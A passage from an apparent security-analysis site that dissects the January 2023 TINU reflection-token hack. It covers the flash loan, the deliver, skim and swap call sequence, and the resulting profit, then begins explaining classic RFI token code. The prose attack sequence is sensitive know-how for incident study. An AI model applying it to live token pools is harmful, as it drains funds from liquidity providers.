
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <link rel="canonical" href="https://autosaida.github.io/DeFiHackAnalysis/2023/230126_TINU/">
      
      
        <link rel="prev" href="../230119_SHOCO/">
      
      
        <link rel="next" href="../230415_HundredFinance/">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.41">
    
    
      
        <title>230126-TINU - DeFiHackAnalysis</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.0253249f.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Merriweather+Sans:300,300i,400,400i,700,700i%7CRed+Hat+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Merriweather Sans";--md-code-font:"Red Hat Mono"}</style>
      
    
    
      <link rel="stylesheet" href="https://unpkg.com/katex@0/dist/katex.min.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="deep-purple">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#230126-tinu" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="DeFiHackAnalysis" class="md-header__button md-logo" aria-label="DeFiHackAnalysis" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            DeFiHackAnalysis
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              230126-TINU
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="deep-purple"  aria-label="Dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="deep-orange"  aria-label="Light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/Autosaida/DeFiHackAnalysis" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="DeFiHackAnalysis" class="md-nav__button md-logo" aria-label="DeFiHackAnalysis" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    DeFiHackAnalysis
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/Autosaida/DeFiHackAnalysis" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Home
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    2022
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            2022
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2022/221025_ULME/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    221025-ULME
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2022/221129_MBC/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    221129-MBC-ZZSH
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    2023
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            2023
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../230119_SHOCO/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    230119-SHICO
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    230126-TINU
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    230126-TINU
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#attacktx" class="md-nav__link">
    <span class="md-ellipsis">
      AttackTx
    </span>
  </a>
  
    <nav class="md-nav" aria-label="AttackTx">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#fund-flow" class="md-nav__link">
    <span class="md-ellipsis">
      Fund Flow
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#balance-changes" class="md-nav__link">
    <span class="md-ellipsis">
      Balance Changes
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#state-changes" class="md-nav__link">
    <span class="md-ellipsis">
      State Changes
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#invocation-flow" class="md-nav__link">
    <span class="md-ellipsis">
      Invocation Flow
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vulnerability" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerability
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Vulnerability">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reflection-token" class="md-nav__link">
    <span class="md-ellipsis">
      Reflection Token
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tinu" class="md-nav__link">
    <span class="md-ellipsis">
      TINU
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploit" class="md-nav__link">
    <span class="md-ellipsis">
      Exploit
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exploit">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reproduce" class="md-nav__link">
    <span class="md-ellipsis">
      Reproduce
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attack-flow" class="md-nav__link">
    <span class="md-ellipsis">
      Attack Flow
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../230415_HundredFinance/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    230415-HundredFinance
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../230905_FloorDAO/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    230905-FloorDAO
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../230905_HeavensGate_JumpFarm_QuantumWN/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    230905-HeavensGate-JumpFarm-QuantumWN
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../231018_MicDao/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    231018-MicDao
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../231206_TIME/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    231206-TIME
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    2024
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            2024
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2024/240415_ChaingeFinance/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    240415-ChaingeFinance
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#attacktx" class="md-nav__link">
    <span class="md-ellipsis">
      AttackTx
    </span>
  </a>
  
    <nav class="md-nav" aria-label="AttackTx">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#fund-flow" class="md-nav__link">
    <span class="md-ellipsis">
      Fund Flow
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#balance-changes" class="md-nav__link">
    <span class="md-ellipsis">
      Balance Changes
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#state-changes" class="md-nav__link">
    <span class="md-ellipsis">
      State Changes
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#invocation-flow" class="md-nav__link">
    <span class="md-ellipsis">
      Invocation Flow
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vulnerability" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerability
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Vulnerability">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reflection-token" class="md-nav__link">
    <span class="md-ellipsis">
      Reflection Token
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tinu" class="md-nav__link">
    <span class="md-ellipsis">
      TINU
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploit" class="md-nav__link">
    <span class="md-ellipsis">
      Exploit
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exploit">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reproduce" class="md-nav__link">
    <span class="md-ellipsis">
      Reproduce
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attack-flow" class="md-nav__link">
    <span class="md-ellipsis">
      Attack Flow
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
  


<h1 id="230126-tinu">230126-TINU</h1>
<h2 id="attacktx">AttackTx</h2>
<p>Analyzing the <a href="https://phalcon.blocksec.com/explorer/tx/eth/0x6200bf5c43c214caa1177c3676293442059b4f39eb5dbae6cfd4e6ad16305668">attack transaction</a> using Phalcon.</p>
<h3 id="fund-flow">Fund Flow</h3>
<p><img alt="" src="../../image/230126_TINU.assets/4309.png" /></p>
<p>The fund flow is straightforward. Initially, about 139 WETH is flash loaned from Balancer and returned after the attack ends. </p>
<p>104.85 WETH is used to swap for TINU tokens on the Uniswap pool, while withdrawing around 127 WETH additionally. Finally, WETH is converted to ETH to bribe flashbots builder, resulting in a profit of approximately 22.11 ETH.</p>
<p>From the fund flow, alone, it can only be seen that there is a vulnerability in the TINU token.</p>
<h3 id="balance-changes">Balance Changes</h3>
<p><img alt="" src="../../image/230126_TINU.assets/5112.png" /></p>
<h3 id="state-changes">State Changes</h3>
<p><img alt="" src="../../image/230126_TINU.assets/5430.png" /></p>
<p>Apart from the ordinary Pair-related state variable changes, it's noteworthy that there were several state changes in the TINU token itself.</p>
<h3 id="invocation-flow">Invocation Flow</h3>
<p>Next, let's analyze the internal invocation details of the transaction.</p>
<p><img alt="" src="../../image/230126_TINU.assets/5610.png" /></p>
<p>Firstly, the attack contract borrows WETH from Balancer.</p>
<p><img alt="" src="../../image/230126_TINU.assets/5851.png" /></p>
<p>Then, in the callback, it first buys TINU tokens with 104.85 WETH, and then uses the obtained TINU amount as a parameter to call the <code>deliver</code> function of the TINU contract. It then calls the pair's <code>skim</code> function. The balance of the attackContract is significantly higher than before, indicating that the <code>deliver</code> function call likely increased the amount of TINU tokens in the pair.</p>
<p>Next, it calls the <code>deliver</code> function again with the entire balance as a parameter. Without transferring TINU tokens, it directly calls the pair's <code>swap</code> function, withdrawing around 127 WETH. This is about 22 more WETH than used for the initial purchase, resulting in a profit. The flash loan is also repaid.</p>
<p>Clearly, this attack exploits the <code>deliver</code> function of the TINU token. Further analysis is needed in conjunction with the code to understand it better.</p>
<h2 id="vulnerability">Vulnerability</h2>
<p>In fact, TINU is a type of reflection token. Before delving into the analysis of TINU's vulnerabilities and attack principles, let's first understand the classic reflection token.</p>
<h3 id="reflection-token">Reflection Token</h3>
<p>The classic reflection token <a href="https://github.com/regohiro/reflect-contract-doc">RFI</a> is deployed at <a href="https://etherscan.io/address/0xa1afffe3f4d611d252010e3eaf6f4d77088b0cd7">0xa1afff</a>.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kt">uint256</span><span class="w"> </span><span class="k">private </span><span class="nv">constant</span><span class="w"> </span>MAX<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">~</span><span class="kt">uint256</span><span class="p">(</span><span class="m m-Decimal">0</span><span class="p">);</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="kt">uint256</span><span class="w"> </span><span class="k">private </span><span class="nv">constant</span><span class="w"> </span>_tTotal<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">10</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="m m-Decimal">10</span><span class="o">**</span><span class="m m-Decimal">6</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="m m-Decimal">10</span><span class="o">**</span><span class="m m-Decimal">9</span><span class="p">;</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="kt">uint256</span><span class="w"> </span><span class="k">private </span><span class="nv">_rTotal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span>MAX<span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">(</span>MAX<span class="w"> </span><span class="o">%</span><span class="w"> </span>_tTotal<span class="p">));</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="kt">function</span><span class="w"> </span><span class="nv">totalSupply</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>view<span class="w"> </span>override<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span>_tTotal<span class="p">;</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="p">}</span>
</span></code></pre></div>
<p>Different from traditional ERC20 tokens, the reflection token defines the original <code>totalSupply</code> as <code>tTotal</code> and introduces <code>rTotal</code> additionally. Initially, <code>rTotal</code> is a multiple of <code>tTotal</code> that is less than or equal to <code>MAX</code> and closest to <code>MAX</code>.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="kt">constructor</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">    </span>_rOwned<span class="p">[</span>_msgSender<span class="p">()]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_rTotal<span class="p">;</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">    </span>emit<span class="w"> </span>Transfer<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="m m-Decimal">0</span><span class="p">),</span><span class="w"> </span>_msgSender<span class="p">(),</span><span class="w"> </span>_tTotal<span class="p">);</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="p">}</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>
